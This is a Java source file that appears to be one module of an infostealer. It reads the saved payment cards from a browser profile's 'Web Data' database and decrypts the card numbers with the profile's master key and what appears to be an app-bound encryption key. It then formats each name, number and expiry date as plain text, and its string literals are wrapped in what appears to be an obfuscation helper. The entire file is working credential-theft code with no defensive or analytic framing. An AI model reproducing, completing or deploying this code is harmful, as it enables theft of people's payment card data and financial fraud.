package noface.browsers;

import noface.config.S;

import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.List;

public final class Card {

    public record Entry(String name, String month, String year, String number) {}

    private static String sql() {
        return S.e("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards");
    }

    public static List<Entry> pull(Profile profile) {
        List<Entry> out = new ArrayList<>();
        if (profile.masterKey() == null) return out;
        Path db = profile.dir().resolve(S.e("Web Data"));
        if (!Files.isRegularFile(db)) return out;
        Db.query(db, sql(), rs -> add(rs, profile, out));
        return out;
    }

    private static void add(ResultSet rs, Profile profile, List<Entry> out) {
        try {
            String name = rs.getString(1);
            String month = rs.getString(2);
            String year = rs.getString(3);
            byte[] enc = rs.getBytes(4);
            String number = "";
            if (enc != null && enc.length > 0) {
                String d = Aes.decrypt(enc, profile.masterKey(), profile.abeKey());
                if (d != null) number = d;
            }
            if ((number == null || number.isBlank()) && (name == null || name.isBlank())) return;
            out.add(new Entry(
                    name == null ? "" : name,
                    month == null ? "" : month,
                    year == null ? "" : year,
                    number == null ? "" : number
            ));
        } catch (Exception ignored) {
        }
    }

    public static String fmt(List<Entry> entries) {
        StringBuilder sb = new StringBuilder();
        for (Entry e : entries) {
            sb.append(S.e("Name: ")).append(e.name()).append('\n');
            sb.append(S.e("Number: ")).append(e.number()).append('\n');
            sb.append(S.e("Exp: ")).append(e.month()).append('/').append(e.year()).append("\n\n");
        }
        return sb.toString();
    }

    private Card() {}
}
